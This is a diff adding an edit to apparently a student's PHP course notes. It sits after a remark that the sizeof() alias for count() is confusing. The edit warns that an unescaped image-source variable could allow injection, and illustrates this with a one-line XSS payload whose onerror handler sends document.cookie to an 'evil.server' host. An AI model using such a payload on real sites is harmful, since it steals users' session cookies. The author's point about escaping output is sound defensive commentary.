@@ -37,5 +37,9 @@ use of sizeof() alias for count()... It is a bad habit bc it cofuses people who 
 To be honsest, I have no idea what the creators of PHP had in mind creating such a confusing alias. There are a lot of tricky things that exist both in C and PHP - 
 some function names, for(;;) loop, printf("%d", printf("Hello world!")), passing parameters by reference like in C++ and so on... So why name something not
 related to memory allocation at all sizeof - I dont know. But I believe one should just not use this alias at all. </br>
+- EDIT: In this project we used hard-coded default profile picture, but if it was some real project I would probably make sure that in line here: </br>
+<img src='$coverPhotoSrc' class='coverPhoto'></br>
+$coverPhotoSrc variable will never turn into something like: ' onerror="this.src='http://evil.server/exploit.php?'+document.cookie" />. </br>
+It is always better to double check everything, especially if it was some real life scenario and not Udemy course project, that much I know...
 
 
